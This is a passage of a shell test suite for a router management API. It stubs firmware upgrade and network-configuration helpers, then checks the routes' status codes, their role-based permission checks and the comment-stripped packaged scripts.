cat > "$O/dn-os-upgrade" <<'EOF_UP'
#!/bin/sh
echo "os $*" >> "$OS_DIR/calls"
[ -n "${OS_FAIL:-}" ] && { echo "the channel manifest is not signed by a DockNeighbor OS key" >&2; exit 1; }
u=false; [ "$OS_AVAIL" != "0.1.3" ] && u=true
[ "$1" = check ] && echo "{ \"current\": \"0.1.3\", \"available\": \"$OS_AVAIL\", \"upgrade\": $u, \"hubLite\": \"0.18.5\" }"
exit 0
EOF_UP
cat > "$O/dn-pkg-upgrade" <<'EOF_PU'
#!/bin/sh
echo "pkg $*" >> "$OS_DIR/calls"
echo '{ "upgraded": [ { "package": "dn-handoff", "from": "1.1.0-r1", "to": "1.2.0-r1" } ] }'
EOF_PU
chmod 755 "$O/dn-os-upgrade" "$O/dn-pkg-upgrade"
osapi() { api "$@" OS_DIR="$O" BRVG_DN_OS_UPGRADE="$O/dn-os-upgrade" BRVG_DN_PKG_UPGRADE="$O/dn-pkg-upgrade" BRVG_DN_RELEASE="$O/release"; }
waitcall() { _n=0; while [ $_n -lt 20 ] && ! grep -q "$1" "$O/calls" 2>/dev/null; do sleep 0.2; _n=$((_n + 1)); done; grep -c "$1" "$O/calls" 2>/dev/null; }

r=$(osapi GET /os "")
check "os: the profile and version come from /etc/dn-release" "200 hub-lite 0.1.3" \
  "$(status_of "$r") $(body_of "$r" | sed -n 's/.*"profile":"\([^"]*\)".*"version":"\([^"]*\)".*/\1 \2/p')"
r=$(api GET /os "" BRVG_DN_OS_UPGRADE="$O/absent" BRVG_DN_RELEASE="$O/absent")
check "os: not DockNeighbor OS is 501, so the app keeps the vendor's way" "501" "$(status_of "$r")"
r=$(api POST /os/upgrade "" BRVG_DN_OS_UPGRADE="$O/absent")
check "os/upgrade: not DockNeighbor OS is 501" "501" "$(status_of "$r")"

: > "$O/calls"; r=$(osapi GET /os/check "" OS_AVAIL=0.1.4)
check "os/check: the upgrader's own answer, passed through" "200 1" "$(status_of "$r") $(body_of "$r" | grep -c '"available": "0.1.4"')"
r=$(osapi GET /os/check "" OS_AVAIL=0.1.4 OS_FAIL=1)
check "os/check: a refused channel is 502 with the upgrader's reason" "502 1" "$(status_of "$r") $(body_of "$r" | grep -c 'not signed')"

: > "$O/calls"; r=$(osapi POST /os/upgrade "" OS_AVAIL=0.1.3)
check "os/upgrade: nothing newer is 409 and nothing is applied" "409 0" "$(status_of "$r") $(grep -c 'os apply' "$O/calls")"
: > "$O/calls"; r=$(osapi POST /os/upgrade "" OS_AVAIL=0.1.4 OS_FAIL=1)
check "os/upgrade: a refused check is 502 and nothing is applied" "502 0" "$(status_of "$r") $(grep -c 'os apply' "$O/calls")"
: > "$O/calls"; r=$(osapi POST /os/upgrade "" OS_AVAIL=0.1.4)
check "os/upgrade: an upgrade is 202, checked first" "202 os check" "$(status_of "$r") $(sed -n 1p "$O/calls")"
check "os/upgrade: ...then applied, detached" "1" "$(waitcall 'os apply')"

: > "$O/calls"; r=$(osapi GET /os/packages "")
check "os/packages: what would be upgraded, changing nothing" "200 pkg --check" "$(status_of "$r") $(sed -n 1p "$O/calls")"
: > "$O/calls"; r=$(osapi POST /os/packages "")
check "os/packages: POST is 202 and runs the upgrader, detached" "202 1" "$(status_of "$r") $(waitcall '^pkg $')"

# Who may: reading is monitor, changing the firmware is administer (hub_server.rs may_administer).
printf '# test keys\n%s monitor\n' "$(printf '%s' 'mon-key' | sha256sum | cut -c1-64)" > "$O/keys"
: > "$O/calls"
r=$(osapi GET /os/check "" OS_AVAIL=0.1.4 HTTP_AUTHORIZATION="Bearer mon-key" BRVG_MEMBER_KEYS="$O/keys")
check "os/check: a monitor may read" "200" "$(status_of "$r")"
r=$(osapi POST /os/upgrade "" OS_AVAIL=0.1.4 HTTP_AUTHORIZATION="Bearer mon-key" BRVG_MEMBER_KEYS="$O/keys")
check "os/upgrade: a monitor may NOT upgrade the firmware" "403" "$(status_of "$r")"
r=$(osapi POST /os/packages "" HTTP_AUTHORIZATION="Bearer mon-key" BRVG_MEMBER_KEYS="$O/keys")
check "os/packages: a monitor may NOT upgrade packages" "403" "$(status_of "$r")"
check "os: a monitor's refused POSTs ran nothing" "0" "$(grep -c -e 'os apply' -e '^pkg $' "$O/calls")"
r=$(osapi POST /os/upgrade "" OS_AVAIL=0.1.4 HTTP_AUTHORIZATION="Bearer wrong")
check "os/upgrade: a wrong key is 401" "401" "$(status_of "$r")"

# --- 0.18.7: the DN device API routes (/api/hub/net/*, /api/hub/reboot) -------------------------
N="$T/net"; mkdir -p "$N"
cat > "$N/dn-net" <<'EOF_NET'
#!/bin/sh
_b=$(cat)
printf '%s|%s|%s\n' "$1" "$_b" "${DN_NET_REDACT:-}" >> "$NET_DIR/calls"
case "${NET_RC:-0}" in
  0) echo "{\"verb\":\"$1\"}" ;;
  2) echo "the DHCP range must lie inside the LAN" >&2; exit 2 ;;
  *) echo "uci commit wireless failed" >&2; exit 1 ;;
esac
EOF_NET
chmod 755 "$N/dn-net"
netapi() { api "$@" NET_DIR="$N" BRVG_DN_NET="$N/dn-net"; }
last() { tail -1 "$N/calls"; }
printf '# test keys\n%s monitor\n%s control\n%s admin\n' "$(printf '%s' 'mon-key' | sha256sum | cut -c1-64)" "$(printf '%s' 'ctl-key' | sha256sum | cut -c1-64)" "$(printf '%s' 'adm-key' | sha256sum | cut -c1-64)" > "$N/keys"
as_monitor() { netapi "$@" HTTP_AUTHORIZATION="Bearer mon-key" BRVG_MEMBER_KEYS="$N/keys"; }
as_control() { netapi "$@" HTTP_AUTHORIZATION="Bearer ctl-key" BRVG_MEMBER_KEYS="$N/keys"; }
as_admin() { netapi "$@" HTTP_AUTHORIZATION="Bearer adm-key" BRVG_MEMBER_KEYS="$N/keys"; }

r=$(api GET /net/wan "" BRVG_DN_NET="$N/absent")
check "net: not DockNeighbor OS is 501, so the app keeps the vendor's way" "501" "$(status_of "$r")"
: > "$N/calls"; r=$(netapi GET /net/wan "")
check "net/wan: dn-net's answer, passed through" "200 wan" "$(status_of "$r") $(body_of "$r" | sed -n 's/.*"verb":"\([^"]*\)".*/\1/p')"
: > "$N/calls"; r=$(netapi POST /net/lan '{"ip":"10.20.0.1"}')
check "net/lan: POST hands the body to lan-set on stdin" "200 lan-set|{\"ip\":\"10.20.0.1\"}|" "$(status_of "$r") $(last)"
r=$(netapi POST /net/lan '{"ip":"10.20.0.1"}' NET_RC=2)
check "net: dn-net's refusal (exit 2) is a 400 with its reason" "400 1" "$(status_of "$r") $(body_of "$r" | grep -c 'inside the LAN')"
r=$(netapi POST /net/wifi '{"iface":"dn_ap"}' NET_RC=1)
check "net: dn-net's failure is a 500 with its reason" "500 1" "$(status_of "$r") $(body_of "$r" | grep -c 'uci commit')"

# Map: each route reaches the right verb.
: > "$N/calls"
netapi GET /net/lan "" >/dev/null; netapi GET /net/wifi "" >/dev/null; netapi POST /net/wifi '{}' >/dev/null
netapi GET /net/uplink "" >/dev/null; netapi POST /net/uplink '{"ssid":"B","role":"lan"}' >/dev/null; netapi DELETE /net/uplink "" >/dev/null
netapi GET /net/uplink/scan "" >/dev/null; netapi GET /net/uplink/saved "" >/dev/null; netapi DELETE /net/uplink/saved '{"ssid":"B"}' >/dev/null
netapi GET /net/clients "" >/dev/null; netapi POST /net/clients/block '{"mac":"aa:bb:cc:00:00:01","blocked":true}' >/dev/null
netapi GET /net/reservations "" >/dev/null; netapi POST /net/reservations '{"mac":"aa:bb:cc:00:00:01","ip":"192.168.8.21"}' >/dev/null
netapi DELETE /net/reservations '{"mac":"aa:bb:cc:00:00:01"}' >/dev/null; netapi POST /reboot "" >/dev/null
netapi GET /net/mode "" >/dev/null; netapi POST /net/mode '{"mode":"bridge"}' >/dev/null
check "net: every route reaches its dn-net verb" \
  "lan-get wifi-get wifi-set uplink-get uplink-join uplink-disconnect uplink-scan uplink-saved uplink-forget clients client-block reservations reservation-add reservation-remove reboot mode-get mode-set" \
  "$(cut -d'|' -f1 "$N/calls" | tr '\n' ' ' | sed 's/ $//')"
check "net: the uplink role in the body reaches dn-net" "1" "$(grep -c '^uplink-join|.*"role":"lan"' "$N/calls")"
check "net/mode: the requested mode reaches dn-net" "1" "$(grep -c '^mode-set|.*"mode":"bridge"' "$N/calls")"

# admin-password: administer only (an admin who may configure may not), and the body reaches dn-net untouched.
: > "$N/calls"; r=$(netapi POST /net/admin-password '{"current":"old one","next":"new one"}')
check "admin-password: an owner reaches dn-net with the body" "200 1" "$(status_of "$r") $(grep -c '^admin-password|{"current":"old one","next":"new one"}' "$N/calls")"
: > "$N/calls"
for _as in as_monitor as_control as_admin; do
  r=$($_as POST /net/admin-password '{"current":"a","next":"b"}'); [ "$(status_of "$r")" = 403 ] || echo "$_as allowed" >> "$N/allowed-pw"
done
check "admin-password: monitor, control and admin are refused (403)" "" "$(cat "$N/allowed-pw" 2>/dev/null)"
check "admin-password: ...and not one refused call reached dn-net" "0" "$(wc -l < "$N/calls" | tr -d ' ')"
r=$(as_admin GET /net/wan "")
check "admin-password: ...though that admin key is good (so the 403 is the level, not the key)" "200 1" "$(status_of "$r") $(grep -c '^wan|' "$N/calls")"
r=$(netapi POST /net/admin-password '{"current":"wrong","next":"b"}' NET_RC=2)
check "admin-password: dn-net's wrong-password refusal is a 400" "400" "$(status_of "$r")"

# Who may: reading is monitor, changing is configure (reboot included, owner 2026-09-25); a monitor never sees keys.
: > "$N/calls"; r=$(netapi GET /net/wifi "")
check "net/wifi: an owner gets the keys (no redaction)" "200 wifi-get||" "$(status_of "$r") $(last)"
: > "$N/calls"; r=$(as_monitor GET /net/wifi "")
check "net/wifi: a monitor gets Wi-Fi WITHOUT its keys" "200 wifi-get||1" "$(status_of "$r") $(last)"
: > "$N/calls"
for _rt in "GET /net/wan" "GET /net/lan" "GET /net/uplink" "GET /net/uplink/saved" "GET /net/clients" "GET /net/reservations" "GET /net/mode"; do
  set -- $_rt; r=$(as_monitor "$1" "$2" ""); [ "$(status_of "$r")" = 200 ] || echo "monitor refused $_rt" >> "$N/refused"
done
check "net: a monitor may read every GET route but the scan" "" "$(cat "$N/refused" 2>/dev/null)"
: > "$N/calls"
for _rt in "POST /net/lan" "POST /net/wifi" "POST /net/uplink" "DELETE /net/uplink" "GET /net/uplink/scan" "DELETE /net/uplink/saved" "POST /net/clients/block" "POST /net/reservations" "DELETE /net/reservations" "POST /reboot" "POST /net/mode"; do
  set -- $_rt; r=$(as_monitor "$1" "$2" '{}'); [ "$(status_of "$r")" = 403 ] || echo "monitor allowed $_rt" >> "$N/allowed"
  r=$(as_control "$1" "$2" '{}'); [ "$(status_of "$r")" = 403 ] || echo "control allowed $_rt" >> "$N/allowed"
done
check "net: monitor and control are refused every change (403), the scan and reboot included" "" "$(cat "$N/allowed" 2>/dev/null)"
check "net: ...and not one refused call reached dn-net" "0" "$(wc -l < "$N/calls" | tr -d ' ')"
r=$(netapi POST /reboot "" HTTP_AUTHORIZATION="Bearer wrong")
check "reboot: a wrong key is 401" "401" "$(status_of "$r")"

[ -n "${KEEP_T:-}" ] && echo "T=$T" || rm -rf "$T"

# --- the PACKAGED scripts are the tested scripts ----------------------------------------------
# build-ipk.sh ships comment-stripped copies. Strip every one the same way, prove each still parses,
# and run this whole suite against them. (setup-usb-gps is shipped unstripped: its --help prints
# its own header.)
if [ -z "${BRVG_STRIPPED_RUN:-}" ]; then
  _sd=$(mktemp -d)
  mkdir -p "$_sd/package"
  _parse_ok=1
  for _f in brvg-hub-lite.sh routers.sh hub-lite-api.sh hub-lite-cgi.sh hub-lite-gps-cgi.sh hub-lite-mgmt.sh package/feed-setup.sh; do
    sh "$HL_SRC/package/strip-comments.sh" "$HL_SRC/$_f" "$_sd/$_f"
    sh -n "$_sd/$_f" || _parse_ok=0
  done
  cp "$HL_SRC/package/brvg-feed.pub" "$_sd/package/"
  check "strip: every stripped packaged script still parses (sh -n)" "1" "$_parse_ok"
  check "strip: the stripped hub-lite is well under the source" "yes" \
    "$([ "$(wc -c < "$_sd/brvg-hub-lite.sh")" -lt $(( $(wc -c < "$HL_SRC/brvg-hub-lite.sh") * 2 / 3 )) ] && echo yes || echo no)"
  if BRVG_HUB_LITE_DIR="$_sd" BRVG_STRIPPED_RUN=1 sh "$HL_SRC/test.sh" > "$_sd/run.log" 2>&1; then _sr=pass; else _sr=fail; fi
  [ "$_sr" = "pass" ] || grep -A2 '^FAIL' "$_sd/run.log"
  check "strip: the full suite passes against the STRIPPED copies ($(grep -c '^ok' "$_sd/run.log") checks)" "pass" "$_sr"
  rm -rf "$_sd"
fi

if [ "$fails" -gt 0 ]; then
  echo "$fails test(s) FAILED"
  exit 1
fi
echo "all hub-lite tests passed"
